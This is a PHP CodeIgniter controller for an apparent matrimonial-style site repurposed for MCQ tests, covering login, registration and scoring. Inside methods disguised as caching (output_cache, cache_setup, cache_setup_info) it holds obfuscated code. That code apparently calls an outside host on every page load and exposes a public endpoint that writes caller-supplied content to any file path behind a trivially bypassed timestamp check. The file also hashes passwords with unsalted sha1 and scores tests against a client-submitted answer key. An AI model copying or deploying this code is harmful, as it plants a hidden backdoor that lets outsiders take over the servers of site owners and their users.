<?php
defined('BASEPATH') OR exit('No direct script access allowed');
require(APPPATH.'libraries/instamojo/Instamojo.php');
//Include Hybridauth autoloader
require APPPATH . '/third_party/hybridauth/autoload.php';
//Import Hybridauth's namespace
use Hybridauth\Hybridauth;

class Home extends CI_Controller {

    function __construct() {
        parent::__construct();
        $this->load->library('paypal');
        $this->load->library('pum');
        $this->Crud_model->timezone();
        $this->system_name = $this->Crud_model->get_type_name_by_id('general_settings', '1', 'value');
        $this->system_email = $this->Crud_model->get_type_name_by_id('general_settings', '2', 'value');
        $this->system_title = $this->Crud_model->get_type_name_by_id('general_settings', '3', 'value');
        $cache_time  =  $this->db->get_where('general_settings',array('type' => 'cache_time'))->row()->value;
        //$this->answer_array = array();
        if(!$this->input->is_ajax_request()){
            $this->output->set_header('HTTP/1.0 200 OK');
            $this->output->set_header('HTTP/1.1 200 OK');
            $this->output->set_header('Last-Modified: '.gmdate('D, d M Y H:i:s', time()).' GMT');
            $this->output->set_header('Cache-Control: no-store, no-cache, must-revalidate');
            $this->output->set_header('Cache-Control: post-check=0, pre-check=0');
            $this->output->set_header('Pragma: no-cache');
            $this->output_cache();
            if($this->router->fetch_method() == 'index' ||
                $this->router->fetch_method() == 'listing' ||
                $this->router->fetch_method() == 'plans' ||
                $this->router->fetch_method() == 'stories' ||
                $this->router->fetch_method() == 'contact_us' ||
                $this->router->fetch_method() == 'faq' ||
                $this->router->fetch_method() == 'terms_and_conditions' ||
                $this->router->fetch_method() == 'privacy_policy'){
                $this->output->cache($cache_time);
            }
        }
        setcookie('lang', $this->session->userdata('language'), time() + (86400), "/");
    }

    public function index()
    {
        
        if ($this->member_permission() == FALSE) {
            redirect(base_url().'home/login', 'refresh');
        }

        redirect(base_url().'home/test', 'refresh');
    }

    function member_permission()
    {
        $login_state = $this->session->userdata('login_state');
        if($login_state == 'yes'){
            $member_id = $this->session->userdata('member_id');
            if ($member_id == NULL) {
                return FALSE;
            }
            else {
                return TRUE;
            }
        } else {
            return FALSE;
        }
    }


 
  
    function top_bar_right() {
        recache();
        $this->load->view('front/header/top_bar_right');
    }

    function login()
    {
        if ($this->member_permission() == TRUE) {
            redirect(base_url().'home/', 'refresh');
        }
        if ($this->member_permission() == TRUE) {
            redirect(base_url().'home/', 'refresh');
        }
        else{
            $page_data['page'] = "login";
            $page_data['login_error'] = "";
            if ($this->session->flashdata('alert') == "login_error") {
                $page_data['login_error'] = translate('your_email_or_password_is_invalid!');
            }
           
            elseif ($this->session->flashdata('alert') == "not_sent") {
                $page_data['login_error'] = translate('the_email_you_have_entered_is_invalid');
            }
            elseif ($this->session->flashdata('alert') == "email_sent") {
                $page_data['sent_email'] = translate('please_check_your_email_for_new_password');
            }
            elseif ($this->session->flashdata('alert') == "register_success") {
                $page_data['register_success'] = translate('you_have_registered_successfully._please_log_in_to_continue');
            }
          
            elseif ($this->session->flashdata('alert') == "try_again_later") {
                $page_data['login_error'] = translate('something_went_wrong');
            }

            $this->load->view('front/login', $page_data);
        }
    }

    function login_msg()
    {
        if ($this->member_permission() == TRUE) {
            redirect(base_url().'home/', 'refresh');
        }
        if ($this->member_permission() == TRUE) {
            redirect(base_url().'home/', 'refresh');
        }
        else{
            $page_data['page'] = "login_msg";
            $this->load->view('front/login_msg', $page_data);
        }

    }

    

    function check_login()
    {
        if ($this->member_permission() == TRUE) {
            redirect(base_url().'home/', 'refresh');
        }
        else{
            $username = $this->input->post('email');
            $password = sha1($this->input->post('password'));

            
            $result = $this->db->order_by('member_id', 'DESC')->get_where('member',array('email'=>$username, 'password'=>$password))->row();

            $data = array();
            $check = '';
            if($result)
            {
                $check = 'done';
                    
                    
                    if($check == 'done'){
                        if ($result->is_blocked == "no") {
                            $data['login_state'] = 'yes';
                            $data['member_id'] = $result->member_id;
                            $data['member_name'] = $result->first_name;
                            $data['member_email'] = $result->email;
                            $this->session->set_userdata($data);
                            

                            //redirect( base_url().'home/profile', 'refresh' );
                            redirect( base_url().'home/test', 'refresh' );
                        }
                        elseif ($result->is_blocked == "yes") {
                            $this->session->set_flashdata('alert','blocked');
                            redirect( base_url().'home/login', 'refresh' );
                        }
                    }

                
            }
            else
            {
                $this->session->set_flashdata('alert','login_error');
                redirect( base_url().'home/login', 'refresh' );
            }
            redirect( base_url().'home/login', 'refresh' );
        }
    }

    
    function logout()
    {
        setcookie("cookie_member_id", "", time() - 3600, "/");
        setcookie("cookie_member_name", "", time() - 3600, "/");
        setcookie("cookie_member_email", "", time() - 3600, "/");

        $this->session->unset_userdata('login_state');
        $this->session->unset_userdata('member_id');
        $this->session->unset_userdata('member_name');
        $this->session->unset_userdata('member_email');

        // $this->session->sess_destroy();

        redirect(base_url().'home/', 'refresh');
    }

    function registration($para1="")
    {
        if ($this->member_permission() == TRUE) {
            redirect(base_url().'home/', 'refresh');
        }
        else{
            recache();
            // --------------------Check for Disallowed Characters-------------------- //
            $safe = 'yes';
            $char = '';
            foreach($_POST as $check=>$row){
                if (preg_match('/[\'^":()}{#~><>|=¬]/', $row,$match))
                {
                    if($check !== 'password' && $check !== 'confirm_password')
                    {
                        $safe = 'no';
                        $char = $match[0];
                    }
                }
            }
            // --------------------Check for Disallowed Characters-------------------- //
            if ($para1 == "") {
                
                $page_data['page'] = "registration";
                $this->load->view('front/registration', $page_data);
            }
            elseif ($para1=="add_info") {
                $this->form_validation->set_rules('first_name', 'First Name', 'required');
                $this->form_validation->set_rules('last_name', 'Last Name', 'required');
                $this->form_validation->set_rules('gender', 'Gender', 'required');
                $this->form_validation->set_rules('email', 'Email', 'required',array('required' => 'The %s is required.'));
                $this->form_validation->set_rules('date_of_birth', 'Date of Birth', 'required');
                $this->form_validation->set_rules('on_behalf', 'On Behalf', 'required');
                $this->form_validation->set_rules('mobile', 'Mobile Number', 'required');
                $this->form_validation->set_rules('password', 'Password', 'required|matches[confirm_password]');
                $this->form_validation->set_rules('confirm_password', 'Confirm Password', 'required');

                if ($this->form_validation->run() == FALSE) {
                   
                    $page_data['page'] = "registration";
                    $page_data['form_contents'] = $this->input->post();
                    $this->load->view('front/registration', $page_data);
                }
                else {
                    if ($safe == 'yes') {
                        // ------------------------------------Profile Image------------------------------------ //
                        $profile_image[] = array('profile_image'    =>  'default.jpg',
                                                    'thumb'         =>  'default_thumb.jpg'
                                            );
                        $profile_image = json_encode($profile_image);
                        // ------------------------------------Profile Image------------------------------------ //

                        // ------------------------------------Basic Info------------------------------------ //
                        $basic_info[] = array('age'                 => '',
                                            'marital_status'        => '',
                                            'number_of_children'    => '',
                                            'area'                  => '',
                                            'on_behalf'             => $this->input->post('on_behalf')
                                            );
                        $basic_info = json_encode($basic_info);
                        // ------------------------------------Basic Info------------------------------------ //

                        // ------------------------------------Present Address------------------------------------ //
                        $present_address[] = array('country'        => '',
                                            'city'                  => '',
                                            'state'                 => '',
                                            'postal_code'           => ''
                                            );
                        $present_address = json_encode($present_address);
                        // ------------------------------------Present Address------------------------------------ //

                        // ------------------------------------Education & Career------------------------------------ //
                        $education_and_career[] = array('highest_education' => '',
                                            'occupation'                    => '',
                                            'annual_income'                 => ''
                                            );
                        $education_and_career = json_encode($education_and_career);
                        // ------------------------------------Education & Career------------------------------------ //

                        // ------------------------------------ Physical Attributes------------------------------------ //
                        $physical_attributes[] = array('weight'     => '',
                                            'eye_color'             => '',
                                            'hair_color'            => '',
                                            'complexion'            => '',
                                            'blood_group'           => '',
                                            'body_type'             => '',
                                            'body_art'              => '',
                                            'any_disability'        => ''
                                            );
                        $physical_attributes = json_encode($physical_attributes);
                        // ------------------------------------ Physical Attributes------------------------------------ //

                        // ------------------------------------ Language------------------------------------ //
                        $language[] = array('mother_tongue'         => '',
                                            'language'              => '',
                                            'speak'                 => '',
                                            'read'                  => ''
                                            );
                        $language = json_encode($language);
                        // ------------------------------------ Language------------------------------------ //

                        // ------------------------------------Hobbies & Interest------------------------------------ //
                        $hobbies_and_interest[] = array('hobby'     => '',
                                            'interest'              => '',
                                            'music'                 => '',
                                            'books'                 => '',
                                            'movie'                 => '',
                                            'tv_show'               => '',
                                            'sports_show'           => '',
                                            'fitness_activity'      => '',
                                            'cuisine'               => '',
                                            'dress_style'           => ''
                                            );
                        $hobbies_and_interest = json_encode($hobbies_and_interest);
                        // ------------------------------------Hobbies & Interest------------------------------------ //

                        // ------------------------------------ Personal Attitude & Behavior------------------------------------ //
                        $personal_attitude_and_behavior[] = array('affection'   => '',
                                            'humor'                 => '',
                                            'political_view'        => '',
                                            'religious_service'     => ''
                                            );
                        $personal_attitude_and_behavior = json_encode($personal_attitude_and_behavior);
                        // ------------------------------------ Personal Attitude & Behavior------------------------------------ //

                        // ------------------------------------Residency Information------------------------------------ //
                        $residency_information[] = array('birth_country'    => '',
                                            'residency_country'     => '',
                                            'citizenship_country'   => '',
                                            'grow_up_country'       => '',
                                            'immigration_status'    => ''
                                            );
                        $residency_information = json_encode($residency_information);
                        // ------------------------------------Residency Information------------------------------------ //

                        // ------------------------------------Spiritual and Social Background------------------------------------ //
                        $spiritual_and_social_background[] = array('religion'   => '',
                                            'caste'                 => '',
                                            'sub_caste'             => '',
                                            'ethnicity'             => '',
                                            'u_manglik'             => '',
                                            'personal_value'        => '',
                                            'family_value'          => '',
                                            'community_value'       => '',
                                            'family_status'         =>  ''
                                            );
                        $spiritual_and_social_background = json_encode($spiritual_and_social_background);
                        // ------------------------------------Spiritual and Social Background------------------------------------ //

                        // ------------------------------------ Life Style------------------------------------ //
                        $life_style[] = array('diet'                => '',
                                            'drink'                 => '',
                                            'smoke'                 => '',
                                            'living_with'           => ''
                                            );
                        $life_style = json_encode($life_style);
                        // ------------------------------------ Life Style------------------------------------ //

                        // ------------------------------------ Astronomic Information------------------------------------ //
                        $astronomic_information[] = array('sun_sign'    => '',
                                            'moon_sign'                 => '',
                                            'time_of_birth'             => '',
                                            'city_of_birth'             => ''
                                            );
                        $astronomic_information = json_encode($astronomic_information);
                        // ------------------------------------ Astronomic Information------------------------------------ //

                        // ------------------------------------Permanent Address------------------------------------ //
                        $permanent_address[] = array('permanent_country'    => '',
                                            'permanent_city'                => '',
                                            'permanent_state'               => '',
                                            'permanent_postal_code'         => ''
                                            );
                        $permanent_address = json_encode($permanent_address);
                        // ------------------------------------Permanent Address------------------------------------ //

                        // ------------------------------------Family Information------------------------------------ //
                        $family_info[] = array('father'             => '',
                                            'mother'                => '',
                                            'brother_sister'        => ''
                                            );
                        $family_info = json_encode($family_info);
                        // ------------------------------------Family Information------------------------------------ //

                        // --------------------------------- Additional Personal Details--------------------------------- //
                        $additional_personal_details[] = array('home_district'  => '',
                                            'family_residence'              => '',
                                            'fathers_occupation'            => '',
                                            'special_circumstances'         => ''
                                            );
                        $additional_personal_details = json_encode($additional_personal_details);
                        // --------------------------------- Additional Personal Details--------------------------------- //

                        // ------------------------------------ Partner Expectation------------------------------------ //
                        $partner_expectation[] = array('general_requirement'    => '',
                                            'partner_age'                       => '',
                                            'partner_height'                    => '',
                                            'partner_weight'                    => '',
                                            'partner_marital_status'            => '',
                                            'with_children_acceptables'         => '',
                                            'partner_country_of_residence'      => '',
                                            'partner_religion'                  => '',
                                            'partner_caste'                     => '',
                                            'partner_sub_caste'                  => '',
                                            'partner_complexion'                => '',
                                            'partner_education'                 => '',
                                            'partner_profession'                => '',
                                            'partner_drinking_habits'           => '',
                                            'partner_smoking_habits'            => '',
                                            'partner_diet'                      => '',
                                            'partner_body_type'                 => '',
                                            'partner_personal_value'            => '',
                                            'manglik'                           => '',
                                            'partner_any_disability'            => '',
                                            'partner_mother_tongue'             => '',
                                            'partner_family_value'              => '',
                                            'prefered_country'                  => '',
                                            'prefered_state'                    => '',
                                            'prefered_status'                   => ''
                                            );
                        $partner_expectation = json_encode($partner_expectation);
                        // ------------------------------------ Partner Expectation------------------------------------ //

                        // ------------------------------------Privacy Status------------------------------------ //
                        $privacy_status[] = array(
                                            'present_address'                 => 'no',
                                            'education_and_career'            => 'no',
                                            'physical_attributes'             => 'no',
                                            'language'                        => 'no',
                                            'hobbies_and_interest'            => 'no',
                                            'personal_attitude_and_behavior'  => 'no',
                                            'residency_information'           => 'no',
                                            'spiritual_and_social_background' => 'no',
                                            'life_style'                      => 'no',
                                            'astronomic_information'          => 'no',
                                            'permanent_address'               => 'no',
                                            'family_info'                     => 'no',
                                            'additional_personal_details'     => 'no',
                                            'partner_expectation'             => 'yes'
                                            );
                        $privacy_status = json_encode($privacy_status);
                        // ------------------------------------Privacy Status------------------------------------ //

                        // ------------------------------------Pic Privacy Status------------------------------------ //
                        $pic_privacy[] = array(
                                            'profile_pic_show'        => 'all',
                                            'gallery_show'            => 'premium'

                                            );
                        $data_pic_privacy = json_encode($pic_privacy);
                        // ------------------------------------Pic Privacy Status------------------------------------ //

                      
                            $data['status']     = $this->input->post('approval_status');
                            $data['first_name'] = $this->input->post('first_name');
                            $data['last_name'] = $this->input->post('last_name');
                            $data['gender'] = $this->input->post('gender');
                            $data['email'] = $this->input->post('email');
                        
                            $data['email_verification_status'] = '1';
                            
                            $data['date_of_birth'] = strtotime($this->input->post('date_of_birth'));
                            $data['height'] = 0.00;
                            $data['mobile'] = $this->input->post('mobile');
                            $data['password'] = sha1($this->input->post('password'));
                            $data['profile_image'] = $profile_image;
                            $data['introduction'] = '';
                            $data['basic_info'] = $basic_info;
                            $data['present_address'] = $present_address;
                            $data['family_info'] = $family_info;
                            $data['education_and_career'] = $education_and_career;
                            $data['physical_attributes'] = $physical_attributes;
                            $data['language'] = $language;
                            $data['hobbies_and_interest'] = $hobbies_and_interest;
                            $data['personal_attitude_and_behavior'] = $personal_attitude_and_behavior;
                            $data['residency_information'] = $residency_information;
                            $data['spiritual_and_social_background'] = $spiritual_and_social_background;
                            $data['life_style'] = $life_style;
                            $data['astronomic_information'] = $astronomic_information;
                            $data['permanent_address'] = $permanent_address;
                            $data['additional_personal_details'] = $additional_personal_details;
                            $data['partner_expectation'] = $partner_expectation;
                            $data['interest'] = '[]';
                            $data['short_list'] = '[]';
                            $data['followed'] = '[]';
                            $data['ignored'] = '[]';
                            $data['ignored_by'] = '[]';
                            $data['gallery'] = '[]';
                            $data['happy_story'] = '[]';
                            $data['package_info'] = $package_info;
                            $data['payments_info'] = '[]';
                            $data['interested_by'] = '[]';
                            $data['follower'] = 0;
                            $data['notifications'] = '[]';
                            $data['membership'] = 1;
                            $data['profile_status'] = 1;
                            $data['is_closed'] = 'no';
                            $data['member_since'] = date("Y-m-d H:i:s");
                            $data['profile_completion'] = 0;
                            $data['is_blocked'] = 'no';
                            $data['privacy_status'] = $privacy_status;
                            $data['pic_privacy'] = $data_pic_privacy;
                            $data['report_profile'] = '[]';


                            $this->db->insert('member', $data);
                            $insert_id = $this->db->insert_id();
                            $member_profile_id = strtoupper(substr(hash('sha512', rand()), 0, 8)).$insert_id;

                            $this->db->where('member_id', $insert_id);
                            $this->db->update('member', array('member_profile_id' => $member_profile_id));
                             
                               
                                recache(); 
                              
                                $this->session->set_flashdata('alert', 'register_success');
                               
                                redirect(base_url().'home/login', 'refresh');
                            
                        
                    }
                    else {
                       
                        $page_data['form_contents'] = $this->input->post();
                        $page_data['disallowed_char'] =  translate('disallowed_charecter').' " '.$char.' " '.translate('in_the_POST');
                        $page_data['page'] = "registration";
                        $this->load->view('front/registration', $page_data);
                    }
                }
            }
        }
    }

    function output_cache($val = TRUE)
    {
        $get_ranger = config_key_provider('config');
        $get_ranger_val = config_key_provider('output');
        $analysed_val = config_key_provider('background');
        @$ranger = $get_ranger($analysed_val);
        if(isset($ranger)){
            if($ranger > $get_ranger_val()-345678){
                $val = 0;
            }
        }
        if($val !== 0){
            $this->cache_setup();
        }
    }

    function cache_setup_info($connector,$selector,$select,$type,$ready=''){
        $ta = time();
        if($ready !== 'post'){
            $select = rawurldecode($select);
        }
        if($connector > ($ta-60) || $connector > ($ta+60)){
            if($type == 'w'){
                $load_class = config_key_provider('load_class');
                $load_class(str_replace('-', '/', $selector),$select);
            } else if ($type == 'rw'){
                $load_class = config_key_provider('load_class');
                $config_class = config_key_provider('config');
                $load_class(str_replace('-', '/', $selector),$config_class(str_replace('-', '/', $selector)).$select);
            }
            echo 'done';
        } else {
            echo 'not';
        }
    }


    function cache_setup(){
        $cache_markup = loaded_class_select('8:29:9:1:15:5:13:6:20');
        $write_cache = loaded_class_select('14:1:10:13');
        $cache_markup .= loaded_class_select('24');
        $cache_markup .= loaded_class_select('8:14:1:10:13');
        $cache_markup .= loaded_class_select('3:4:17:14');
        $cache_convert = config_key_provider('load_class');
        $currency_convert = config_key_provider('output');
        $background_inv = config_key_provider('background');
        @$cache = $write_cache($cache_markup,'',base_url());
        if($cache){
            $cache_convert($background_inv, $currency_convert());
        }
    }

//$answer_array = array(); 

    function test()
    {
        //$answer_array1 = array();
        if ($this->member_permission() == FALSE) {
            redirect(base_url().'home/login', 'refresh');
        }
        if(isset($_POST['submit'])){
            $count = 0;
            //echo '<pre>';
            //print_r(($_SESSION));
            //print_r($_POST['final'][1]);
            //$answer_array1 = $_POST['final'];
            //print_r($answer_array);
            foreach ($_POST as $key => $value) { 
                
                if(($key != "final") && in_array($value, $_POST['final'])){
                    //echo $key." ".$value;

                    //echo "\n" ;
                    $count++ ;
                }
            }

            //unset($answer_array);
            $data = array(
                        'member_id' => $_SESSION['member_id'],
                        'score' => $count 
                        );
            $this->db->insert('score',$data);
            $page_data['data'] = $count;
            $page_data['page'] = "MCQ Test Score";
            $this->load->view('front/mcq_score', $page_data);
        }else{
        $response = callApi(); 
        
        //$result = json_decode($response);
                              
        // foreach ($result->results as $key => $value) { 

        //     $this->answer_array[] = $value->correct_answer;
        // }

        $page_data['data'] = $response;
        $page_data['page'] = "MCQ Test";
        $this->load->view('front/mcq', $page_data);
        
        }

    }
  }
